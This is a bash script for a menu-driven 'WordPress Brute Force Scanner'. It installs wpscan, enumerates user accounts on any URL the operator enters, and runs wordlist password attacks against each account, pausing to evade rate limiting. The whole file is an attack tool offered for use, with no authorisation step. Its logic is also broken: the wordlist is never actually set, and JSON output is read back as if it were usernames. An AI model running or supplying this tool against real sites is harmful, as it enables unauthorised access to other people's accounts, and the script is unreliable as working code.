bash
#!/bin/bash

# Color definitions for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Initialize variables
current_website=""
current_wordlist=""
user_list_file="user_list.txt"
brute_force_log="brute_force.log"

# Check internet connection
check_internet() {
    if ! curl -sSf https://google.com; then
        echo -e "${RED}[!]${NC} No internet connection available. Please check your network."
        exit 1
    fi
}

# Install wpscan if needed
install_wpscan() {
    if ! command -v wpscan &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} Installing wpscan... (this may take a few minutes)"
        curl -sSL https://dl.wpscan.com/wpscan-latest-linux-amd64.tar.gz -o wpscan.tar.gz
        tar -xzf wpscan.tar.gz
        mv wpscan-linux-amd64 /usr/local/bin/wpscan
        rm -f wpscan.tar.gz
        echo -e "${GREEN}[+]${NC} wpscan installed successfully"
    else
        echo -e "${GREEN}[+]${NC} wpscan is already installed"
    fi
}

# Check if website uses WordPress
check_wordpress() {
    if [ -z "$current_website" ]; then
        echo -e "${RED}[!]${NC} Please select a website URL first."
        return 1
    fi
    
    echo -e "${GREEN}[+]${NC} Checking if $current_website uses WordPress..."
    wpscan --url "$current_website" --no-report --vulns --output-format json | grep -q "WordPress"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+]${NC} $current_website is a WordPress site!"
    else
        echo -e "${RED}[!]${NC} $current_website does not appear to be a WordPress site."
    fi
}

# Run user enumeration
user_enum() {
    if [ -z "$current_website" ]; then
        echo -e "${RED}[!]${NC} Please select a website URL first."
        return 1
    fi
    
    echo -e "${GREEN}[+]${NC} Running user enumeration..."
    wpscan --url "$current_website" --enumerate u --no-report --output-format json > "$user_list_file"
    
    if [ ! -s "$user_list_file" ]; then
        echo -e "${RED}[!]${NC} No users found. Please try a different website or method."
        return 1
    fi
    
    echo -e "${GREEN}[+]${NC} User list saved to $user_list_file"
    return 0
}

# Run brute force attack
brute_force() {
    if [ -z "$current_website" ] || [ -z "$current_wordlist" ]; then
        echo -e "${RED}[!]${NC} Please select a website URL and a wordlist first."
        return 1
    fi
    
    if [ ! -f "$user_list_file" ]; then
        echo -e "${RED}[!]${NC} User list not generated. Run option 5 first."
        return 1
    fi
    
    echo -e "${GREEN}[+]${NC} Starting brute force attack..."
    echo "Starting brute force for $current_website with wordlist $current_wordlist" > "$brute_force_log"
    
    # Run with progress tracking
    local count=0
    while IFS= read -r user; do
        ((count++))
        echo -e "[$count/$(wc -l < "$user_list_file")] Trying user: $user"
        wpscan --url "$current_website" --passwords "$current_wordlist" --user "$user" --max-threads 10 --no-report 2>&1 | tee -a "$brute_force_log"
        sleep 0.5  # Prevent rate limiting
    done < "$user_list_file"
    
    echo -e "${GREEN}[+]${NC} Brute force completed. Results saved to $brute_force_log"
}

# List available wordlists
list_wordlists() {
    local wordlist_dir="./wordlists"
    if [ ! -d "$wordlist_dir" ]; then
        echo -e "${YELLOW}[!]${NC} Wordlists directory not found. Creating..."
        mkdir -p "$wordlist_dir"
    fi
    
    echo -e "${GREEN}[+]${NC} Available wordlists:"
    ls -1 "$wordlist_dir" | while read f; do
        echo "  - $f"
    done
    
    echo -e "${YELLOW}[!]${NC} To add new wordlists, place them in $wordlist_dir"
}

# Main menu
main_menu() {
    while true; do
        clear
        echo -e "${BLUE}============================================${NC}"
        echo -e "${BLUE}| WordPress Brute Force Scanner             ${NC}"
        echo -e "${BLUE}============================================${NC}"
        echo -e "${GREEN}| 1. Check WordPress Installation           ${NC}"
        echo -e "${GREEN}| 2. Enter Website URL                     ${NC}"
        echo -e "${GREEN}| 3. Select Wordlist                      ${NC}"
        echo -e "${GREEN}| 4. Check if WordPress Site              ${NC}"
        echo -e "${GREEN}| 5. Run User Enumeration                 ${NC}"
        echo -e "${GREEN}| 6. Run Brute Force Attack              ${NC}"
        echo -e "${GREEN}| :----------------------------------------${NC}"
        echo -e "${GREEN}| 0. Exit                                 ${NC}"
        echo -e "${BLUE}============================================${NC}"
        
        echo -e "${GREEN}Enter your choice (1-6 or 0 to exit): ${NC}"
        read -p " " choice
        
        case $choice in
            1) check_internet; install_wpscan; ;;
            2) read -p "Enter website URL (e.g., https://example.com): " current_website; ;;
            3) list_wordlists; ;;
            4) check_wordpress; ;;
            5) user_enum; ;;
            6) brute_force; ;;
            0) exit 0 ;;
            *) echo -e "${RED}[!]${NC} Invalid choice. Please try again."; ;;
        esac
    done
}

# Main execution
check_internet
install_wpscan
main_menu
